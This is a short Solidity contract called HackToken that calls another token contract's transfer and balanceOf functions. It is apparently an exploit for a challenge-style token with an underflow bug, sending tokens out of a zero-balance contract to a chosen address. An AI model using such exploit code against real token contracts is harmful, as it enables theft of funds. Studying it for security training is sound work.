// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract HackToken{
    IToken token;

    constructor(address tokenContract){
        token = IToken(tokenContract);
    }
    
    function getMoreTokens( address to, uint256 value) public{
        token.transfer(to, value);
    }

    function getBal(address account) public view returns(uint256){
        return token.balanceOf(account);
    }
}